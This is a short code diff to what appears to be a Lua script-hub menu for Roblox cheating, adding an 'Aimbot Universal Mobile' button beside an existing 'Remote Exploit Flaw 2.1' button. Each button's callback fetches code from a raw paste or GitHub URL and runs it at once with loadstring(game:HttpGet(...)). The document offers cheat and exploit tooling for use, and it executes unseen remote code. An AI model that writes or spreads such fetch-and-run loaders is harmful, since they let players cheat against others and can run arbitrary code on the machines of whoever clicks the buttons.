@@ -415,6 +415,13 @@ Tab3:AddButton({
 })
 
 Tab3:AddButton({
+    Name = "Aimbot Universal Mobile",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastefy.app/3yixAuAo/raw"))()
+    end    
+})
+
+Tab3:AddButton({
     Name = "Remote Exploit Flaw 2.1",
     Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/v0c0n1337/scripts/refs/heads/main/remote%20abuse%202.1.lua"))()
